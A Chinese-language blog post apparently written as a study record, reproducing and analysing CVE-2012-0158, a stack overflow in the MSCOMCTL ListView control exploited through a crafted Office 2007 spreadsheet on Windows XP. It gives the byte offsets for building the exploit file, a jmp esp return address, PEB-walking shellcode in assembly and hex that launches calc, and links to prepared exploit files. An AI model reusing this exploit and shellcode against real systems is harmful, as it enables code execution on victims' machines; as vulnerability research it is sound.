<!DOCTYPE html><html><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="This blog is used to record my study process"><title>CVE-2012-0158 分析 | Marsman1996's blog</title><link rel="stylesheet" type="text/css" href="/css/normalize.css"><link rel="stylesheet" type="text/css" href="/css/highlight.css"><link rel="stylesheet" type="text/css" href="/css/very-simple.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/font-awesome/4.5.0/css/font-awesome.min.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><meta name="generator" content="Hexo 5.4.0"></head><body><!-- include the sidebar--><!-- include ./includes/sidebar.jade--><!-- Blog title and subtitle--><header><div class="container header"><a id="logo" href="/." class="title">Marsman1996's blog</a><br><span class="subtitle">一小股火星军, 两小股火星军, 三小股火星军~</span><label id="toggle-menu" for="menu" onclick><i class="fa fa-bars"></i></label></div></header><!-- use checkbox hack for toggle nav-bar on small screens--><input id="menu" type="checkbox"><!-- Navigation Links--><nav id="nav"><div class="container"><a href="/" class="sidebar-nav-item active">Home</a><a href="/archives" class="sidebar-nav-item">Archives</a></div></nav><div id="header-margin-bar"></div><!-- gallery that comes before the header--><div class="wrapper"><div class="container post-header"><h1>CVE-2012-0158 分析</h1></div></div><div class="wrapper"><div class="container meta"><div class="post-time">2018-11-15</div><div class="post-categories"><a class="post-category-link" href="/categories/%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/">复现分析</a></div><div class="post-tags"><a class="post-tag-none-link" href="/tags/CVE/" rel="tag">CVE</a>/<a class="post-tag-none-link" href="/tags/Windows/" rel="tag">Windows</a></div></div></div><article><div class="container post"><p>这篇文章主要记录我复现和分析 CVE-2012-0158 的过程.</p>
<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录<!-- omit in toc --></h2><ul>
<li><a href="#Environment">Environment</a></li>
<li><a href="#POC%E6%9E%84%E9%80%A0">POC构造</a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86">漏洞原理</a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">漏洞利用</a></li>
<li><a href="#Download">Download</a></li>
<li><a href="#REFERENCE">REFERENCE</a></li>
<li><a href="#PS-shellcode%E7%BC%96%E5%86%99">PS: shellcode编写</a><ul>
<li><a href="#%E7%9B%B4%E6%8E%A5%E7%A1%AC%E7%BC%96%E7%A0%81%E5%9C%B0%E5%9D%80%E7%9A%84shellcode">直接硬编码地址的shellcode</a></li>
<li><a href="#%E5%8A%A8%E6%80%81%E8%8E%B7%E5%8F%96api%E5%9C%B0%E5%9D%80%E7%9A%84shellcode">动态获取api地址的shellcode</a></li>
</ul>
</li>
</ul>
<h2 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h2><p>操作系统: VMware Windows XP SP3<br>Office 版本: 2007 标准版 32位</p>
<h2 id="POC构造"><a href="#POC构造" class="headerlink" title="POC构造"></a>POC构造</h2><p>通过excel的开发工具插入 <em>Microsoft ListView</em>, 并写一些VB代码如  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Dim L1 As ListItem</span><br><span class="line">Set L1 = ListView1.ListItems.Add(1, &quot;key1&quot;, &quot;test1&quot;, 0, 0)</span><br></pre></td></tr></table></figure>

<p>然后编译VB, 删除代码后保存  </p>
<blockquote>
<p>不删除代码会被office拦截插件执行  </p>
</blockquote>
<p>此时用 WinHex 打开可以看到 <font color=red><b>Cobj</b></font> 关键字, 将 <strong>Cobj</strong> 后的2个 <code>08 00 00 00</code> 修改为某个大于 08 的数 (如<code>18 00 00 00</code>) 使其发生溢出. 此时打开 poc.xls 发现程序崩溃.</p>
<blockquote>
<p>只改其中一个什么都不会发生</p>
</blockquote>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>使用OllyDBG调试刚刚构造的poc文件, 崩溃时程序栈如下图:(当然上面还有些异常函数处理的栈空间, 这里就不截图进来了)<br><img src="cve-2012-0158/stackink.jpg" width = 50% height = 50%/><br>我们可以猜测漏洞是由 <em>MSCOMCTL</em> 中的函数造成的. 为了验证这一猜测我们可以加断点使程序在加载 <em>MSCOMCTL</em> 时中断: <code>bp LoadLibraryExW,[UNICODE [esp+4]] == &quot;C:\\WINDOWS\\system32\\MSCOMCTL.OCX&quot;</code> 在 Ollydbg 的 Memory 窗口对 Excel .text段下断点后运行程序使加载 <em>MSCOMCTL</em> 过程完成, 再进入 <em>MSCOMCTL</em>, 在上面栈中显示的函数下断点. 单步调试后发现程序在执行至 MSCOMCTL.275C8BDD:<code>retn 0x8</code> 时崩溃.<br>用 IDAPro 打开并加载.dbg调试文件后得到 MSCOMCTL.275C8BDD 所在函数的代码为:  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">int __stdcall CObj::Load(int a1, BSTR bstrString)&#123;</span><br><span class="line">    BSTR v2; // ebx@1</span><br><span class="line">    int result; // eax@1</span><br><span class="line">    __int32 v4; // esi@4</span><br><span class="line">    int v5; // [sp+Ch] [bp-14h]@1</span><br><span class="line">    SIZE_T dwBytes; // [sp+14h] [bp-Ch]@3</span><br><span class="line">    int v7; // [sp+18h] [bp-8h]@4</span><br><span class="line">    int v8; // [sp+1Ch] [bp-4h]@8</span><br><span class="line"></span><br><span class="line">    v2 = bstrString;</span><br><span class="line">    result = ReadBytesFromStreamPadded((int)&amp;v5, bstrString, 0xCu);</span><br><span class="line">    if ( result &gt;= 0 )&#123;</span><br><span class="line">        if ( v5 == &#x27;jboC&#x27; &amp;&amp; dwBytes &gt;= 8 )&#123;</span><br><span class="line">            v4 = ReadBytesFromStreamPadded((int)&amp;v7, v2, dwBytes);</span><br><span class="line">            if ( v4 &gt;= 0 )&#123;</span><br><span class="line">                if ( !v7 )</span><br><span class="line">                    goto LABEL_8;</span><br><span class="line">                bstrString = 0;</span><br><span class="line">                v4 = ReadBstrFromStreamPadded((UINT)&amp;bstrString, (int)v2);</span><br><span class="line">                if ( v4 &gt;= 0 )&#123;</span><br><span class="line">                    CObj::SetKey(bstrString);</span><br><span class="line">                    SysFreeString(bstrString);</span><br><span class="line">LABEL_8:</span><br><span class="line">                    if ( v8 )</span><br><span class="line">                    v4 = ReadVariantFromStream((struct tagVARIANT *)(a1 + 20), (struct IStream *)v2);</span><br><span class="line">                    return v4;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            return v4;</span><br><span class="line">        &#125;</span><br><span class="line">        result = -2147418113;</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<!-- 函数调用栈为
    CObj::Load()
    CListItem::Load()
    CListItems::Load()
    CListViewCtrl::LoadBinaryState()
    COleControl::Load()
    ...
-->
<!-- 可以看到 -->

<p>我们继续使用 Ollydbg 调试我们获得的poc.  </p>
<ol>
<li>.text 段查找 <code>CObj::Load()</code>的起始位置<code>55 8B EC 83 EC 14 53 8B  5D 0C 56 57 6A 0C 8D 45</code> 加断点后运行至此</li>
<li>单步运行至第二个<code>ReadBytesFromStreamPadded(int, LPVOID lpMem, SIZE_T dwBytes)</code>, 栈空间如图所示:<br><img src="cve-2012-0158/stack1.png" alt="stack1"><br>发现<code>dwBytes</code>值为0x18, 超过复制的目标<code>int v7</code>的长度, 在复制目标地址<code>0x1374D8</code>处造成栈溢出, 复制完成后栈空间如图所示:<br><img src="cve-2012-0158/stack2.jpg" alt="stack2"><br>查看栈空间发现复制进的内容与Excel中Cobj关键字后的内容相符<br><img src="cve-2012-0158/hex.jpg" alt="hex">  </li>
<li>继续单步运行到 <code>ret 0x8</code> , 返回地址为 <code>FFFFFFFF</code> (之后修改文档中该位置<code>FF FF FF FF</code>就可以任意跳转)</li>
</ol>
<p>那么我们可以认为该漏洞是由<code>CObj::Load()</code>中的一个内存拷贝函数<code>ReadBytesFromStreamPadded()</code>导致的栈溢出造成的.  </p>
<!-- 0x6A626F43 = jboC -->

<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>以Cobj(<code>43 6F 62 6A</code>)中的<code>43</code>所在地址为基准</strong>, 修改<code>Cobj+0x8</code>和<code>Cobj+0xC</code>处size部分为<code>18 10 00 00</code></p>
<blockquote>
<p>增大复制区域以保证shellcode被完全写入栈  </p>
</blockquote>
<p>修改<code>Cobj+0x10</code>为<code>00</code></p>
<blockquote>
<p>此处被<code>Cobj::Load</code>加载为<code>v7</code>, 不修改这个会有额外函数调用, 破坏堆栈结构  </p>
</blockquote>
<p>修改<code>Cobj+0x1C</code>为 <code>12 45 FA 7F</code>  </p>
<blockquote>
<p>0x7FFA4512 处是一个<code>jmp esp</code>指令, 通过这条指令作为跳板<br>还有<code>call esp</code>指令可以使用, 这些指令的具体地址是通过OLLYDBG在 <em>kernel32</em> 或 <em>ntdll</em> 中查找  </p>
</blockquote>
<p>在<code>Cobj+0x28</code>处插入shellcode<br>打开修改后的Excel打开了计算器<br><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/av36105653/" title="bilibili av36105653">演示视频</a></p>
<h2 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h2><p><a href="/download/poc-0xffffffff.xls" title="poc-0xffffffff.xls">跳转地址是0xffffffff的poc</a><br><a href="/download/clac.xls" title="clac.xls">打开计算器示例1</a>      <del>(因为函数地址是硬编码进去的, 可能其他电脑不适用吧…)</del><br><a href="/download/clac_pro.xls" title="clac_pro.xls">打开计算器示例2</a>    (这个是动态获取api地址的, 应该更通用些)<br><a href="/download/mscomctl_2007.dbg" title="MSCOMCTL.dbg">调试文件</a></p>
<h2 id="REFERENCE"><a href="#REFERENCE" class="headerlink" title="REFERENCE"></a>REFERENCE</h2><p><a target="_blank" rel="noopener" href="https://weiyiling.cn/one/cve_2012_0158_ms12-027">CVE-2012-0158（ms12-027）漏洞分析与利用</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/97215.html">Windows平台shellcode开发入门</a></p>
<h2 id="PS-shellcode编写"><a href="#PS-shellcode编写" class="headerlink" title="PS: shellcode编写"></a>PS: shellcode编写</h2><p>这里只是弹一个计算器, 所以C代码很简单<code>WinExec(&quot;calc.exe&quot;, 5);</code><br>但是在shellcode中并不能直接这样调用, 而是需要根据<code>WinExec()</code>的地址来调用  </p>
<h3 id="直接硬编码地址的shellcode"><a href="#直接硬编码地址的shellcode" class="headerlink" title="直接硬编码地址的shellcode"></a>直接硬编码地址的shellcode</h3><p><code>WinExec()</code>的绝对地址是 kernal32.dll 的基地址<code>0x7C800000</code>加<code>WinExec()</code>在kernal32中的偏移<code>0x00063231</code>, 即<code>WinExec()</code>的地址为<code>0x7C863231</code>.<br>然后写成汇编代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">int main(void)&#123;</span><br><span class="line">    __asm&#123;</span><br><span class="line">        push    ebp</span><br><span class="line">        mov     ebp, esp</span><br><span class="line">        //WinExec(&quot;calc.exe&quot;, 5)</span><br><span class="line">        xor     eax,eax</span><br><span class="line">        push    eax</span><br><span class="line">        mov     eax,6578652Eh   //&quot;.exe&quot;</span><br><span class="line">        push    eax</span><br><span class="line">        mov     eax,636C6163h   //&quot;calc&quot;</span><br><span class="line">        push    eax</span><br><span class="line">        mov     eax,esp</span><br><span class="line">        push    5              //Arg2 = SW_SHOW</span><br><span class="line">        push    eax            //Arg1 = &quot;calc.exe&quot;</span><br><span class="line">        mov     eax,7C863231h   //kernel32.WinExec</span><br><span class="line">        call    eax</span><br><span class="line"></span><br><span class="line">        mov     esp,ebp</span><br><span class="line">        pop     ebp</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么我该怎么提取出shellcode呢???</p>
<ol>
<li>Visual Studio</li>
<li>OllyDBG ?</li>
</ol>
<p>得到shellcode为<br><code>55 8B EC 33 C0 50 B8 2E 65 78 65 50 B8 63 61 6C 63 50 8B C4 6A 05 50 B8 31 32 86 7C FF D0 8B E5 5D</code></p>
<h3 id="动态获取api地址的shellcode"><a href="#动态获取api地址的shellcode" class="headerlink" title="动态获取api地址的shellcode"></a>动态获取api地址的shellcode</h3><p>思路是通过查询kernel32.dll的导出表确定<code>GetProcAddress()</code>地址, 再通过<code>GetProcAddress()</code>获取<code>WinExec()</code>地址<br>汇编代码如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">int main(void)&#123;</span><br><span class="line">    __asm&#123;</span><br><span class="line">        //查找kernel32.dll基址</span><br><span class="line">        xor     ecx, ecx</span><br><span class="line">        mov     eax, fs:[ecx + 0x30]        // EAX = PEB</span><br><span class="line">        mov     eax, [eax + 0xc]            // EAX = PEB-&gt;Ldr</span><br><span class="line">        mov     esi, [eax + 0x14]           // ESI = PEB-&gt;Ldr.InMemOrder</span><br><span class="line">        lodsd                               // EAX = Second module</span><br><span class="line">        xchg    eax, esi                    // EAX = ESI, ESI = EAX</span><br><span class="line">        lodsd                               // EAX = Third(kernel32)</span><br><span class="line">        mov     ebx, [eax + 0x10]           // EBX = Base address</span><br><span class="line">        push    ebx</span><br><span class="line">        </span><br><span class="line">        //找到kernel32.dll的导出表</span><br><span class="line">        mov     edx, [ebx + 0x3c]           // EDX = DOS-&gt;e_lfanew</span><br><span class="line">        add     edx, ebx                    // EDX = PE Header</span><br><span class="line">        mov     edx, [edx + 0x78]           // EDX = Offset export table</span><br><span class="line">        add     edx, ebx                    // EDX = Export table</span><br><span class="line">        mov     esi, [edx + 0x20]           // ESI = Offset names table</span><br><span class="line">        add     esi, ebx                    // ESI = Names table</span><br><span class="line">        xor     ecx, ecx                    // EXC = 0</span><br><span class="line"></span><br><span class="line">    Get_Function:</span><br><span class="line">        inc     ecx                                 // Increment the ordinal</span><br><span class="line">        lodsd                                       // Get name offset</span><br><span class="line">        add     eax, ebx                            // Get function name</span><br><span class="line">        cmp     dword ptr[eax], 0x50746547          // GetP</span><br><span class="line">        jnz     Get_Function</span><br><span class="line">        cmp     dword ptr[eax + 0x4], 0x41636f72    // rocA</span><br><span class="line">        jnz     Get_Function</span><br><span class="line">        cmp     dword ptr[eax + 0x8], 0x65726464    // ddre</span><br><span class="line">        jnz     Get_Function</span><br><span class="line"></span><br><span class="line">        //找到GetProcAddress函数地址</span><br><span class="line">        mov     esi, [edx + 0x24]                   // ESI = Offset ordinals</span><br><span class="line">        add     esi, ebx                            // ESI = Ordinals table</span><br><span class="line">        mov     cx, [esi + ecx * 2]                 // CX = Number of function</span><br><span class="line">        dec     ecx             </span><br><span class="line">        mov     esi, [edx + 0x1c]                   // ESI = Offset address table</span><br><span class="line">        add     esi, ebx                            // ESI = Address table</span><br><span class="line">        mov     edx, [esi + ecx * 4]                // EDX = Pointer(offset)</span><br><span class="line">        add     edx, ebx                            // EDX = GetProcAddress</span><br><span class="line"></span><br><span class="line">        //获取WinExec()地址 </span><br><span class="line">        pop     ebx                                 //kernel32.dll</span><br><span class="line">        xor     ecx, ecx                   </span><br><span class="line">        push    ecx</span><br><span class="line">        mov     ecx, 0x61636578                     // xeca</span><br><span class="line">        push    ecx</span><br><span class="line">        sub     dword ptr[esp + 0x3], 0x61          // Remove &quot;a&quot;</span><br><span class="line">        push    0x456e6957                          // WinE</span><br><span class="line">        push    esp                                 //&quot;WinExec&quot;</span><br><span class="line">        push    ebx</span><br><span class="line">        call    edx</span><br><span class="line"></span><br><span class="line">        //执行WinExec()</span><br><span class="line">        xor     ecx, ecx</span><br><span class="line">        push    ecx</span><br><span class="line">        push    0x6578652E                          //&quot;.exe&quot;</span><br><span class="line">        push    0x636C6163                          //&quot;calc&quot;</span><br><span class="line">        mov     ebx, esp</span><br><span class="line">        push    5</span><br><span class="line">        push    ebx</span><br><span class="line">        call    eax</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到shellcode为<br><code>33 C9 64 8B 41 30 8B 40 0C 8B 70 14 AD 96 AD 8B 58 10 53 8B 53 3C 03 D3 8B 52 78 03 D3 8B 72 20 03 F3 33 C9 41 AD 03 C3 81 38 47 65 74 50 75 F4 81 78 04 72 6F 63 41 75 EB 81 78 08 64 64 72 65 75 E2 8B 72 24 03 F3 66 8B 0C 4E 49 8B 72 1C 03 F3 8B 14 8E 03 D3 5B 33 C9 51 B9 78 65 63 61 51 83 6C 24 03 61 68 57 69 6E 45 54 53 FF D2 6A 00 68 2E 65 78 65 68 63 61 6C 63 8B DC 6A 05 53 FF D0</code><br>由于shellcode变长, 因此需要构造另一个插入更长VB代码的 excel 文件, 如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Dim L1 As ListItem</span><br><span class="line">Dim key1 As String</span><br><span class="line">Dim i As Integer</span><br><span class="line">i = 0</span><br><span class="line">key1 = &quot;key1&quot;</span><br><span class="line">While (i &lt; 5)</span><br><span class="line">    key1 = key1 + key1</span><br><span class="line">    i = i + 1</span><br><span class="line">Wend</span><br><span class="line">Set L1 = ListView1.ListItems.Add(1, key1 + &quot;1&quot;, &quot;test1&quot;, 0, 0)</span><br><span class="line">Set L2 = ListView1.ListItems.Add(2, key1 + &quot;2&quot;, &quot;test2&quot;, 0, 0)</span><br><span class="line">Set L3 = ListView1.ListItems.Add(3, key1 + &quot;3&quot;, &quot;test3&quot;, 0, 0)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>VB代码段过短会导致贴入shellcode后超过原来的VB代码段长度 ,在复制过程中出现shellcode不会被完整复制进栈</p>
</blockquote>
</div><!-- comment system--><div class="container"><hr><div class="comment"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="//cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script>
<script type="text/javascript">
var leancloud_appid = 'gE27hCFSwgLvpzCHoSBfhQvw-gzGzoHsz';
var leancloud_appkey = 'zMPlPQ3u72NBSzC6PxM0cqKq';
var valine_url = 'http://example.com/2018/11/15/cve-2012-0158/';
var valine_notify = true;
var valine_verify = true;
var valine_placeholder = '吱一声嘛~ヾﾉ≧∀≦)o';
new Valine({
         av: AV, // source from av-min.js
         el: '.comment' ,
         notify: valine_notify,
         verify: valine_verify,
         app_id: leancloud_appid,
         app_key: leancloud_appkey,
         placeholder: valine_placeholder,
         path: valine_url
     });
</script></div></article><footer id="footer"><div class="container"><div class="bar"><div class="social"><a href="mailto:lqliuyuwei@outlook.com" target="_blank"><i class="fa fa-envelope-o"></i></a><a href="https://github.com/Marsman1996" target="_blank"><i class="fa fa-github"></i></a></div><div class="footer">© 2021 <a href="/" rel="nofollow">Marsman1996</a>. Powered by <a rel="nofollow" target="_blank" href="https://hexo.io">Hexo</a>. Theme <a target="_blank" href="https://github.com/lotabout/very-simple">very-simple</a>.</div></div></div></footer><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.css"><script src="//cdn.bootcss.com/jquery/2.0.3/jquery.min.js"></script><script src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script><script>$(document).ready(function() {
    $(".fancybox").fancybox();
});
</script></body><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=
function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;
e=o.createElement(i);r=o.getElementsByTagName(i)[0];
e.src='//www.google-analytics.com/analytics.js';
r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));
ga('create','UA-129024647-1');ga('send','pageview');</script></html>